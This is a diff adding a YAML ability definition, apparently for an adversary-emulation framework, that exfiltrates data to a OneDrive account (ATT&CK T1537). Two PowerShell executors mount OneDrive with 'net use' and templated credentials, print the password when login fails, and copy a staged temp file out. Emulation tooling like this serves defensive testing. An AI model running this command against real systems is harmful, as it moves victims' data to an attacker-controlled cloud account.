@@ -1,0 +1,61 @@
+ability_id: 4840d6dd-da13-401a-be46-05db56f4e1e0
+access: {}
+additional_info: {}
+buckets:
+- exfiltration
+delete_payload: true
+description: Transfer data to a OneDrive account
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "$err = $(net use y: #{onedrive.url} /user:#{onedrive.username} \"#{onedrive.password}\"\
+    \ 2>&1);\nif($err -Like \"*System error 85*\") {\n  Write-Host \"OneDrive net\
+    \ drive is already mounted!\";\n} elseif($err -Like \"*System error 67*\") {\n\
+    \  Write-Host \"OneDrive net drive mount failed - Check URL!\";\n  Write-Host\
+    \ \"#{onedrive.url}\";\n  exit 1;\n} elseif($err -Like \"*System error 1244*\"\
+    ) {\n  Write-Host \"Could not authenticate to OneDrive - Check Creds!\";\n  Write-Host\
+    \ \"User: #{onedrive.username}\";\n  Write-Host \"Password: #{onedrive.password}\"\
+    ;\n  exit 1;\n}\n\nWrite-Host \"Mount Successful\"\nCopy-Item \"C:\\Windows\\\
+    Temp\\WindowsParentalControlMigration.tmp\" -Destination \"y:\\WindowsParentalControlMigration.tmp\"\
+    \ -Force;\nif(!$?){\n  exit 1;\n}\n\nWrite-Host \"Copy Successfull\"\nexit 0;"
+  language: null
+  name: psh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "$err = $(net use y: #{onedrive.url} /user:#{onedrive.username} \"#{onedrive.password}\"\
+    \ 2>&1);\nif($err -Like \"*System error 85*\") {\n  Write-Host \"OneDrive net\
+    \ drive is already mounted!\";\n} elseif($err -Like \"*System error 67*\") {\n\
+    \  Write-Host \"OneDrive net drive mount failed - Check URL!\";\n  Write-Host\
+    \ \"#{onedrive.url}\";\n  exit 1;\n} elseif($err -Like \"*System error 1244*\"\
+    ) {\n  Write-Host \"Could not authenticate to OneDrive - Check Creds!\";\n  Write-Host\
+    \ \"User: #{onedrive.username}\";\n  Write-Host \"Password: #{onedrive.password}\"\
+    ;\n  exit 1;\n}\n\nWrite-Host \"Mount Successful\"\nCopy-Item \"C:\\Windows\\\
+    Temp\\WindowsParentalControlMigration.tmp\" -Destination \"y:\\WindowsParentalControlMigration.tmp\"\
+    \ -Force;\nif(!$?){\n  exit 1;\n}\n\nWrite-Host \"Copy Successfull\"\nexit 0;"
+  language: null
+  name: pwsh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Exfiltrate data to OneDrive
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: exfiltration
+technique_id: T1537
+technique_name: Transfer Data to Cloud Account
